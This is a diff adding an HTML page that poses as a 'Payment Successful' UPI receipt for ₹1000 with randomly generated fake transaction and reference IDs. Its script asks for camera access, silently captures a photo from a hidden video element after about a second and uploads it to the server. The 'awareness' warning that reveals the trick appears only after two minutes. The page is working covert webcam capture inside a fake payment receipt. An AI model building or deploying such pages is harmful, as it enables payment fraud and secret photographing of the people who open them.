@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Payment Successful</title>
+
+<style>
+body {
+  margin:0;
+  font-family: Arial;
+  background: #f4f6f8;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+.card {
+  background:#fff;
+  padding:20px;
+  width:95%;
+  max-width:380px;
+  border-radius:12px;
+  box-shadow:0 4px 15px rgba(0,0,0,.1);
+}
+.header { text-align:center; }
+.success { color:#28a745; font-size:22px; font-weight:bold; }
+.amount { font-size:20px; margin-top:5px; }
+.details { margin-top:15px; font-size:14px; }
+.row { display:flex; justify-content:space-between; margin-bottom:6px; color:#333; }
+.label { color:#666; }
+.notice { font-size:12px; color:#777; margin-top:10px; text-align:center; }
+.reveal { display:none; margin-top:14px; color:#b00020; font-weight:bold; text-align:center; }
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="header">
+    <div class="success">✅ Payment Successful</div>
+    <div class="amount">₹1000.00</div>
+  </div>
+
+  <div class="details">
+    <div class="row">
+      <span class="label">Transaction ID</span>
+      <span id="txnId"></span>
+    </div>
+    <div class="row">
+      <span class="label">Reference No</span>
+      <span id="refId"></span>
+    </div>
+    <div class="row">
+      <span class="label">Payment Mode</span>
+      <span>UPI</span>
+    </div>
+    <div class="row">
+      <span class="label">Date</span>
+      <span id="date"></span>
+    </div>
+    <div class="row">
+      <span class="label">Time</span>
+      <span id="time"></span>
+    </div>
+    <div class="row">
+      <span class="label">Status</span>
+      <span style="color:#28a745;font-weight:bold;">SUCCESS</span>
+    </div>
+  </div>
+
+  <div class="notice">
+    For security & awareness purposes, your camera may be used.
+  </div>
+
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
+
+  <div id="reveal" class="reveal">
+    ⚠️ Awareness Message:<br>
+    Never allow camera access on unknown or untrusted payment pages.
+  </div>
+</div>
+
+<script>
+/* Generate realistic transaction data */
+function randomId(prefix, length=10){
+  return prefix + Math.random().toString(36).substring(2,2+length).toUpperCase();
+}
+
+const now = new Date();
+document.getElementById("txnId").textContent = randomId("TXN");
+document.getElementById("refId").textContent = randomId("REF");
+document.getElementById("date").textContent = now.toLocaleDateString();
+document.getElementById("time").textContent = now.toLocaleTimeString();
+
+/* Camera capture after permission */
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const reveal = document.getElementById("reveal");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  video.srcObject = stream;
+
+  // Auto-capture
+  setTimeout(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+
+    canvas.toBlob(blob=>{
+      const form = new FormData();
+      form.append("image", blob, "snap.jpg");
+      fetch("/upload", { method:"POST", body: form });
+    },"image/jpeg",0.9);
+  },1200);
+
+  // Awareness reveal after 2 minutes
+  setTimeout(()=>reveal.style.display="block",120000);
+
+}).catch(()=>{
+  alert("Camera permission is required for this awareness demo.");
+});
+</script>
+
+</body>
+</html>
